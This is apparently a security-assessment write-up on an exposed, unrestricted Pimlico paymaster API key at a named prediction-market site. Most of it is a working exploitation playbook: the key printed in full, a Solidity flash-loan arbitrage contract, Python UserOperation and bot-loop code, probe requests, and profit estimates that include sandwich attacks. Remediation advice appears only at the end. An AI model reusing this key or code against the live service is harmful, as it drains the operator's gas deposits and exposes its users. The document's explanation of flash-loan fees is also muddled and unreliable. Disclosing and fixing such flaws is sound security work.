# Flash Loan Attack Methodology via Unrestricted Paymaster

## Context

This document describes how an attacker can exploit an unrestricted Pimlico paymaster (exposed API key with zero sponsorship policy) to run flash loan arbitrage at zero cost.

**Source:** Security assessment of dgpredict.com (July 21, 2026)

---

## The Vulnerability

DGPredict exposes a Pimlico paymaster API key at an unauthenticated endpoint:

```
GET /app/api/pimlico/config
```

Returns:
```json
{
  "bundlerUrl": "https://api.pimlico.io/v2/137/rpc?apikey=pim_XLLbgQTVBQSmN3N1Ag9UoM",
  "paymasterUrl": "https://api.pimlico.io/v2/137/rpc?apikey=pim_XLLbgQTVBQSmN3N1Ag9UoM"
}
```

**Key properties confirmed:**
- No sender whitelist
- No callData restrictions
- No gas cap (sponsors up to 30M gas — full block limit)
- No rate limiting
- Active on 4 chains: Polygon (137), Optimism (10), Arbitrum (42161), Base (8453)

**Paymaster deposits confirmed on-chain:**

| Chain | v0.6 Deposit | v0.7 Deposit | Total |
|-------|-------------|-------------|-------|
| Polygon | 7,484 POL ($3,368) | 5,549 POL ($2,497) | $5,865 |
| Optimism | 0.497 ETH ($1,740) | 0.499 ETH ($1,748) | $3,488 |
| Arbitrum | 0.618 ETH ($2,162) | 0.619 ETH ($2,166) | $4,329 |
| Base | 1.544 ETH ($5,406) | 0.970 ETH ($3,397) | $8,803 |
| **TOTAL** | | | **$22,485** |

---

## The Attack: Flash Loan Arbitrage with Zero Gas Cost

### Prerequisites (Total Cost: $0)

1. A deployed Safe smart account (deployment gas sponsored by the same paymaster)
2. A flash loan arbitrage smart contract (deployed via the paymaster)
3. Knowledge of DEX price discrepancies (publicly available via on-chain data)

### Step-by-Step Exploitation

#### Step 1: Deploy a Safe Smart Account ($0)

The paymaster sponsors account deployment. The attacker uses the Safe factory to create a smart account:

```python
# Pseudocode — attacker deploys Safe via sponsored UserOperation
user_op = {
    "sender": ATTACKER_COUNTERFACTUAL_SAFE_ADDRESS,
    "nonce": "0x0",
    "initCode": SAFE_FACTORY_ADDRESS + SAFE_INIT_DATA,  # Creates the Safe
    "callData": "0x",
    "callGasLimit": "0x100000",
    "verificationGasLimit": "0x200000",
    "preVerificationGas": "0x60000",
    "maxFeePerGas": CURRENT_GAS_PRICE,
    "maxPriorityFeePerGas": CURRENT_PRIORITY_FEE,
    "paymasterAndData": "0x",  # Filled by paymaster
    "signature": SAFE_OWNER_SIGNATURE
}

# Get paymaster sponsorship
response = pimlico_rpc("pm_getPaymasterStubData", [user_op, ENTRY_POINT, CHAIN_ID_HEX])
# Response: {"paymasterAndData": "0x6666666666667849c56f2850848cE1C4da65c68b..."}
# CONFIRMED: Paymaster signs it without any policy check
```

#### Step 2: Deploy Flash Loan Arbitrage Contract ($0)

Deploy the arb contract through the Safe, again sponsored by the paymaster:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract FlashArb is FlashLoanSimpleReceiverBase {
    ISwapRouter public immutable swapRouter;
    address public owner;

    constructor(address _pool, address _router) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_pool)) {
        swapRouter = ISwapRouter(_router);
        owner = msg.sender;
    }

    function executeArb(
        address borrowToken,
        uint256 borrowAmount,
        address[] calldata path,
        address[] calldata routers,
        uint24[] calldata fees
    ) external {
        // Initiate flash loan from Aave
        POOL.flashLoanSimple(address(this), borrowToken, borrowAmount, abi.encode(path, routers, fees), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        (address[] memory path, address[] memory routers, uint24[] memory fees) = 
            abi.decode(params, (address[], address[], uint24[]));

        // Execute multi-hop swap across DEXs
        uint256 currentAmount = amount;
        for (uint256 i = 0; i < path.length - 1; i++) {
            IERC20(path[i]).approve(routers[i], currentAmount);
            currentAmount = ISwapRouter(routers[i]).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: path[i],
                    tokenOut: path[i + 1],
                    fee: fees[i],
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: currentAmount,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }

        // Repay flash loan + premium
        uint256 amountOwed = amount + premium;
        require(currentAmount > amountOwed, "Not profitable");
        IERC20(asset).approve(address(POOL), amountOwed);

        // Profit stays in contract
        return true;
    }

    function withdraw(address token) external {
        require(msg.sender == owner);
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
}
```

#### Step 3: Execute Arbitrage via Sponsored UserOperations ($0 gas)

```python
import asyncio
from eth_account import Account
from web3 import Web3

# Attacker's setup
PIMLICO_KEY = "pim_XLLbgQTVBQSmN3N1Ag9UoM"
CHAIN_ID = 137  # Polygon
ENTRY_POINT = "0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789"

async def execute_arb(safe_address, arb_contract, opportunity):
    """Execute a flash loan arb with zero gas cost."""
    
    # Encode the arb call
    call_data = arb_contract.functions.executeArb(
        opportunity["borrow_token"],
        opportunity["borrow_amount"],
        opportunity["path"],
        opportunity["routers"],
        opportunity["fees"]
    ).build_transaction()["data"]
    
    # Wrap in Safe's execTransaction
    safe_exec_data = encode_safe_exec(arb_contract.address, 0, call_data)
    
    # Build UserOperation
    user_op = build_user_operation(
        sender=safe_address,
        call_data=safe_exec_data,
        nonce=get_nonce(safe_address),
    )
    
    # Get paymaster sponsorship (CONFIRMED: no restrictions)
    paymaster_data = await get_paymaster_data(user_op, CHAIN_ID)
    user_op["paymasterAndData"] = paymaster_data
    
    # Sign with Safe owner key
    user_op["signature"] = sign_user_op(user_op, owner_key)
    
    # Submit to bundler (also using the same Pimlico key)
    tx_hash = await submit_user_op(user_op)
    
    return tx_hash


async def get_paymaster_data(user_op, chain_id):
    """Get paymaster sponsorship — confirmed working with zero restrictions."""
    response = await pimlico_rpc(
        f"https://api.pimlico.io/v2/{chain_id}/rpc?apikey={PIMLICO_KEY}",
        "pm_getPaymasterStubData",
        [user_op, ENTRY_POINT, hex(chain_id)]
    )
    return response["result"]["paymasterAndData"]
```

#### Step 4: Profit Extraction

```python
async def run_arb_loop():
    """Continuous arb scanning + execution loop."""
    while True:
        # Scan for opportunities across DEXs
        opportunities = await scan_arbitrage_opportunities(
            chains=[137, 10, 42161, 8453],
            min_profit_usd=0.01,  # Take EVERYTHING since gas is free
            dexs=["uniswap_v3", "quickswap", "sushiswap", "balancer"]
        )
        
        for opp in opportunities:
            try:
                tx = await execute_arb(safe_address, arb_contract, opp)
                print(f"Arb executed: {opp['estimated_profit_usd']} USD profit")
            except Exception as e:
                pass  # Failed arbs cost nothing (gas still free)
        
        await asyncio.sleep(1)  # Check every second
```

---

## Profit Model

### Without Free Gas (Normal Operator)
- Gas cost per arb: $0.50-$5 (Polygon), $0.05-$0.50 (L2s)
- Minimum profitable opportunity: must exceed gas cost
- Typical daily profit: $500-$2,000 (after gas)

### With Free Gas (Exploiting Paymaster)
- Gas cost per arb: **$0** (paymaster pays)
- Minimum profitable opportunity: **$0.01** (any positive spread)
- Typical daily profit: **$1,000-$10,000+** (capture every micro-opportunity)

### Revenue Breakdown

| Strategy | Per Trade | Trades/Day | Daily Income |
|----------|----------|-----------|--------------|
| Multi-hop DEX arb (tiny spreads) | $1-$50 | 100-500 | $100-$25,000 |
| Flash loan liquidations | $25-$5,000 | 5-50 | $125-$250,000 |
| Sandwich attacks (Polygon) | $5-$500 | 50-300 | $250-$150,000 |
| **Conservative estimate** | | | **$500-$5,000/day** |
| **Volatile market day** | | | **$10,000-$50,000/day** |

---

## Why This Works

1. **Flash loans are free** — Aave charges 0.05% fee, but you're borrowing $2M to make $200, so the fee is $1,000 which comes out of the borrowed amount. If the arb is profitable after the fee, you keep the difference.

2. **Gas is the only barrier** — Normally, a $3 arb opportunity isn't worth taking because gas costs $2-$5. With free gas, EVERY opportunity above $0 is profitable.

3. **No capital needed** — Flash loans provide the capital. Paymaster provides the gas. Attacker needs $0 to start.

4. **Multi-chain multiplier** — The same key works on 4 chains. Run arb bots on all 4 simultaneously.

5. **Confirmed with real data** — `pm_getPaymasterStubData` returns valid `paymasterAndData` for arbitrary senders with arbitrary callData. Tested with 30M gas operations. No policy restriction.

---

## Verification Steps (How to Confirm the Vulnerability)

```python
import httpx

# 1. Confirm key is active and returns gas prices
resp = httpx.post(
    "https://api.pimlico.io/v2/137/rpc?apikey=pim_XLLbgQTVBQSmN3N1Ag9UoM",
    json={"jsonrpc": "2.0", "method": "pimlico_getUserOperationGasPrice", "params": [], "id": 1}
)
print(resp.json())  # Should return gas prices (confirmed)

# 2. Confirm paymaster sponsors arbitrary operations
user_op = {
    "sender": "0x4337084D9E255Ff0702461CF8895CE9E3b5Ff108",  # ANY address
    "nonce": "0x0",
    "initCode": "0x",
    "callData": "0x",  # ANY callData
    "callGasLimit": "0x1C9C380",  # 30M gas (block limit!)
    "verificationGasLimit": "0x100000",
    "preVerificationGas": "0x60000",
    "maxFeePerGas": "0x5F5E100",
    "maxPriorityFeePerGas": "0x5F5E100",
    "paymasterAndData": "0x",
    "signature": "0xff" * 65
}

resp = httpx.post(
    "https://api.pimlico.io/v2/137/rpc?apikey=pim_XLLbgQTVBQSmN3N1Ag9UoM",
    json={"jsonrpc": "2.0", "method": "pm_getPaymasterStubData", "params": [user_op, "0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789", "0x89"], "id": 2}
)
print(resp.json())  # Should return paymasterAndData (confirmed on all 4 chains)
```

---

## Remediation

1. **IMMEDIATE:** Rotate the Pimlico API key
2. **IMMEDIATE:** Remove `/app/api/pimlico/config` endpoint (or add authentication)
3. **Add sponsorship policies in Pimlico dashboard:**
   - Whitelist only your own Safe factory addresses as valid senders
   - Restrict callData to only your app's contract methods (function selectors)
   - Set per-sender gas caps
   - Set global daily spending limits
   - Restrict chains to only the ones your app uses
4. **Move paymaster configuration server-side** — never expose to client

---

## Related Findings

See `DGPREDICT_SECURITY_ASSESSMENT.md` in the Str8Gold repo for the full assessment including:
- Polymarket CLOB credential exposure
- User data IDOR (portfolio/trades queryable for any wallet)
- Infrastructure architecture disclosure
- Missing security headers
- OTP rate limiting absence

---

*Document created: July 21, 2026*
*Assessment conducted by: Str8Gold Security Toolkit*
